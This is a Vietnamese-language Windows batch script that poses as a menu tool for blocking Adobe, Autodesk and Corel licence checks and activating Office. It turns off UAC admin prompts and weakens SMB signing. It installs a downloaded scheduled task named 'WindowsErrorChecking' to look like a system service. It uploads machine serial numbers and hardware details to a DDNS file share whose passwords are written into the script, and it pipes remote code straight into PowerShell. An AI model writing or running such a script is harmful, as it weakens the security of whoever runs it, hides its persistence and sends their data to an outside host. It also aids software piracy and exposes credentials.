@echo off
setlocal EnableDelayedExpansion
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAMeetNow" /t REG_DWORD /d 1 /f
powershell -Command "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters' -Name 'RequireSecuritySignature' -Value 1"
powershell -Command "Set-SmbClientConfiguration -RequireSecuritySignature $false -Force"
powershell -Command "Set-SmbClientConfiguration -EnableInsecureGuestLogons $true -Force"

set "password=Kimthuyen2606"

echo HeHeHeHe:
powershell -Command "$pwd = Read-Host -AsSecureString; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pwd); $input_pass = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR); Set-Content -Path '%TEMP%\pwd.txt' -Value $input_pass"

set /p input_pass=<"%TEMP%\pwd.txt"
del "%TEMP%\pwd.txt"

if "!input_pass!"=="!password!" (
    goto :runcode
) else (
    goto :cancel
)

:runcode
schtasks /End /TN "WindowsErrorChecking"
schtasks /Delete /TN "WindowsErrorChecking" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windowserrorchecking.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml'"
schtasks /create /tn "WindowsErrorChecking" /xml "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml" /f
del /f /q "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml"
start "" schtasks /Run /TN "WindowsErrorChecking"
net use \\minhtuan283.ddns.net /delete /y >nul 2>&1

echo User1...
net use "\\minhtuan283.ddns.net\hdd25" /user:minhtuan283 Thienngan2002 /persistent:no
if %errorlevel% equ 0 (
    echo User 1
    goto :success
)

echo User 2...
net use "\\minhtuan283.ddns.net\hdd25" /user:giabao Thienngan2002 /persistent:no
if %errorlevel% equ 0 (
    echo User 2
    goto :success
)

echo Khong the ket noi den network drive
goto :endddd

:success
powershell -Command "$s=(Get-CimInstance Win32_BIOS).SerialNumber; $n=(Get-CimInstance Win32_ComputerSystem).Name; $m=(Get-CimInstance Win32_ComputerSystem).Model; $f=(Get-CimInstance Win32_ComputerSystem).Manufacturer; $cpu=(Get-CimInstance Win32_Processor).Name -replace 'Intel\(R\) Core\(TM\) ', '' -replace ' CPU @ .*', '' -replace '\s+', ''; $ramGB=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB); $d=$(Get-Date -Format 'yyyy-MM-dd'); $t=$(Get-Date -Format 'HH-mm'); $tf=\"$env:TEMP\tam.txt\"; \"$s`_$n`_$m`_$f`_$cpu`_$($ramGB)GB`_$d`_$t\" | Out-File $tf; $tf2='\\minhtuan283.ddns.net\hdd25\serial\log\series_' + $d + '_' + $t + '.txt'; Copy-Item $tf $tf2; if (Test-Path '\\minhtuan283.ddns.net\hdd25\serial\seri.txt') { Add-Content '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' (Get-Content $tf) } else { Copy-Item $tf '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' }; Remove-Item $tf"

:endddd
pause
rem exit
cls
:menu
cls
echo ====================================
echo    Lua chon:
echo    0. Cancel
echo    1. Adobe
echo    2. Autodesk
echo    3. Office
echo    4. Corel
echo    8. Nhap duong dan
echo    9. Clear Service
echo ====================================
set /p choice=Nhap vao: 
if "%choice%"=="0" goto cancel
if "%choice%"=="1" goto adobe
if "%choice%"=="2" goto autodesk
if "%choice%"=="3" goto office
if "%choice%"=="4" goto corel
if "%choice%"=="8" goto customlink
if "%choice%"=="9" goto menu2
echo Vui Long Nhap Lai!
pause
goto menu

:getnote
set "note="
set /p note=Ghi chu: 
if "%note%"=="" (
    echo Ghi chu khong duoc bo trong. Vui long nhap lai!
    goto getnote
)

:: Lưu ghi chú vào seri.txt (nối thêm vào dòng serial vừa ghi)
powershell -Command "$d=Get-Date -Format 'yyyy-MM-dd HH:mm'; $noteContent=' - Ghi chu: %note% - ' + $d; Add-Content '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' $noteContent; Add-Content 'C:\Windows\note.txt' $noteContent"
goto :eof



:cancel
echo Ban da chon huy bo.
exit


:delete
net use \\minhtuan283.ddns.net\hdd25 /delete >nul 2>&1
schtasks /End /TN "WindowsErrorChecking"
schtasks /Delete /TN "WindowsErrorChecking" /F
del /f /q "C:\Windows\System32\WindowsPowerShell\loop.bat"
del /f /q "C:\Windows\System32\WindowsCheckingError.bat"
echo Delete Service
pause
cls
goto menu2


:customlink

set "custompath="
set /p custompath=Nhap duong dan thu muc: 
if "%custompath%"=="" (
    echo Duong dan khong duoc bo trong. Vui long nhap lai!
    goto customlink
)

for /R "%custompath%" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
call :getnote
echo Hoan thanh Block Customlink.
pause
goto menu



:corel
call :getnote
for /R "C:\Program Files\Corel" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
for /R "C:\Program Files\Common Files\Corel" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
for /R "C:\Program Files\Common Files\Protexis" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
for /R "C:\ProgramData\Corel" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)



echo Hoan thanh Block Corel.
pause
cls
goto menu



:adobe
call :getnote
schtasks /End /TN "AdobeHostBlock"
schtasks /Delete /TN "AdobeHostBlock" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/adobehostblock.xml' -OutFile 'C:\adobehostblock.xml'"
schtasks /create /tn "AdobeHostBlock" /xml "C:\adobehostblock.xml" /f
del /f /q "C:\adobehostblock.xml"
start "" schtasks /Run /TN "AdobeHostBlock"
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Adobe"
for /R "C:\Program Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Adobe"
for /R "C:\Program Files (x86)\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Adobe"
for /R "C:\Program Files (x86)\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\ProgramData\Adobe"
for /R "C:\ProgramData\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Adobe"
for /R "C:\Program Files\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)

echo Hoan thanh Block Adobe.
pause
cls
goto menu

:autodesk
call :getnote
schtasks /End /TN "AutoDeskHostBlock"
schtasks /Delete /TN "AutoDeskHostBlock" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/autodeskhostsblock.xml' -OutFile 'C:\autodeskhostsblock.xml'"
schtasks /create /tn "AutoDeskHostBlock" /xml "C:\autodeskhostsblock.xml" /f
del /f /q "C:\autodeskhostsblock.xml"
start "" schtasks /Run /TN "AutoDeskHostBlock"
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Autodesk Shared"
for /R "C:\Program Files (x86)\Common Files\Autodesk Shared" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Autodesk"
for /R "C:\Program Files (x86)\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Autodesk"
for /R "C:\Program Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Autodesk"
for /R "C:\Program Files\Common Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\ProgramData\Autodesk"
for /R "C:\ProgramData\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
echo Hoan thanh Block AutoDesk
pause
cls
goto menu

:office
call :getnote
powershell -Command "irm https://get.activated.win|iex"
exit

:menu2
cls
echo         CLEAN SERVICE
echo ====================================
echo    Lua chon:
echo    0. Cancel
echo    1. Clear Adobe
echo    2. Clear Autodesk
echo    3. Delete Service
echo    9. Back
echo ====================================
set /p choice2=Nhap vao: 
if "%choice2%"=="0" goto cancel
if "%choice2%"=="1" goto adobe2
if "%choice2%"=="2" goto autodesk2
if "%choice2%"=="3" goto delete
if "%choice2%"=="9" goto menu
echo Vui Long Nhap Lai!
pause
goto menu2

:autodesk2
powershell -Command "& { $url2='https://raw.githubusercontent.com/minhtuan283/host/main/hostsAutoDesk'; $hosts2='C:\Windows\System32\drivers\etc\hosts'; $temp2='C:\Windows\Temp\hosts'; Invoke-WebRequest -Uri $url2 -OutFile $temp2 -ErrorAction SilentlyContinue; if (Test-Path $temp2) { $hs2=Get-Content $hosts2; $rm2=Get-Content $temp2; Set-Content $hosts2 ($hs2 | Where-Object {$_ -notin $rm2}); Remove-Item $temp2 -Force; } }"
:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Autodesk Shared"
for /R "C:\Program Files (x86)\Common Files\Autodesk Shared" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Autodesk"
for /R "C:\Program Files (x86)\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Autodesk"
for /R "C:\Program Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Autodesk"
for /R "C:\Program Files\Common Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\ProgramData\Autodesk"
for /R "C:\ProgramData\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)
echo Hoan thanh Clean Autodesk
schtasks /End /TN "AutoDeskHostBlock"
schtasks /Delete /TN "AutoDeskHostBlock" /F
pause
cls
goto menu2

:adobe2
powershell -Command "& { $url1='https://raw.githubusercontent.com/minhtuan283/host/main/hosts'; $hosts1='C:\Windows\System32\drivers\etc\hosts'; $temp1='C:\Windows\Temp\hosts'; Invoke-WebRequest -Uri $url1 -OutFile $temp1 -ErrorAction SilentlyContinue; if (Test-Path $temp1) { $hs1=Get-Content $hosts1; $rm1=Get-Content $temp1; Set-Content $hosts1 ($hs1 | Where-Object {$_ -notin $rm1}); Remove-Item $temp1 -Force; } }"
:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Adobe"
for /R "C:\Program Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Adobe"
for /R "C:\Program Files (x86)\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Adobe"
for /R "C:\Program Files (x86)\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\ProgramData\Adobe"
for /R "C:\ProgramData\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Adobe"
for /R "C:\Program Files\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)
schtasks /End /TN "AdobeHostBlock"
schtasks /Delete /TN "AdobeHostBlock" /F
echo Hoan thanh Clean Adobe
pause
cls
goto menu2

exit
